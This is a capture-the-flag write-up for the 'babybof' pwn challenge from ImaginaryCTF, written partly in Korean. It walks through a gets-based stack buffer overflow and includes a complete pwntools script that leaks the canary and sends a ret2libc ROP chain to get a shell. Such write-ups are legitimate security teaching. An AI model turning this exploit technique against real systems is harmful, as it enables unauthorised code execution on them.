# babybof - Imaginary
## Challenge Info
- Date: 2025
- CTF Name: Imaginary
- Category: pwn
- Difficulty (subjective): easy
- Points: 100
- Provided Files: vuln(ELF)
- tools: gdb(pwndbg), checksec, pwntool
## Brief Description
welcome to pwn! hopefully you can do your first buffer overflow
## Initial Analysis
### Environment
``` sh
checksec vuln
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
### Code
``` c
undefined8 main(void) {
    long in_FS_OFFSET;
    undefined8 unaff_retaddr;
    undefined buf [56];
    long canary;

    canary = *(long *)(in_FS_OFFSET + 0x28);
    setbuf(stdin,(char *)0x0);
    setbuf(stdout,(char *)0x0);
    puts("Welcome to babybof!");
    puts("Here is some helpful info:");
    printf("system @ %p\n",system);
    printf("pop rdi; ret @ %p\n",0x4011ba);
    printf("ret @ %p\n",0x4011bb);
    printf("\"/bin/sh\" @ %p\n",sh);
    printf("canary: %p\n",canary);
    printf("enter your input (make sure your stack is aligned!): ");
    FUN_004010c0(buf); // gets(buf);
    printf("your input: %s\n",buf);
    printf("canary: %p\n",canary);
    printf("return address: %p\n",unaff_retaddr);
    if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
    }
    return 0;
}
```
카나리, PIE 등의 보호기법이 적용되어 있지만, Return 2 Libc에 필요한 정보를 출력한다.   
## Vulnerability
### BOF(Buffer Overflow)
``` c
FUN_004010c0(buf); // gets(buf);
```
`gets`함수 사용으로 인해, BOF 취약점이 발생한다. 
## Exploit
### Strategy
Return 2 Libc에 필요한 정보를 모두 제공하기 때문에 단순하게 payload만 작성하면 된다.  
### Exploitation Steps
### Stack Frame of main
| Variable Name | Offset from RBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| canary | -0x8 |
| buf | -0x40 |
### payload
``` python
from pwn import *

p = remote('babybof.chal.imaginaryctf.org', 1337)
context.arch = "amd64"

# get info
p.recvuntil(b'system @ ')
system_addr = int(p.recvline().strip(b'\n'), 16)
log.info(f'system_addr: {hex(system_addr)}')
p.recvuntil(b'pop rdi; ret @ ')
pop_rdi_ret = int(p.recvline().strip(b'\n'), 16)
log.info(f'pop_rdi_ret: {hex(pop_rdi_ret)}')
p.recvuntil(b'ret @ ')
ret = int(p.recvline().strip(b'\n'), 16)
log.info(f'ret: {hex(ret)}')
p.recvuntil(b'\"/bin/sh\" @ ')
bin_sh = int(p.recvline().strip(b'\n'), 16)
log.info(f'bin_sh: {hex(bin_sh)}')
p.recvuntil(b'canary: ')
canary = int(p.recvline().strip(b'\n'), 16)
log.info(f'canary: {hex(canary)}')

# payload
payload = b''
payload += b'A' * 0x38 + p64(canary) + b'B' * 0x8
payload += p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)
p.sendafter(b'enter your input (make sure your stack is aligned!): ', payload)

# interactiv
p.interactive()
```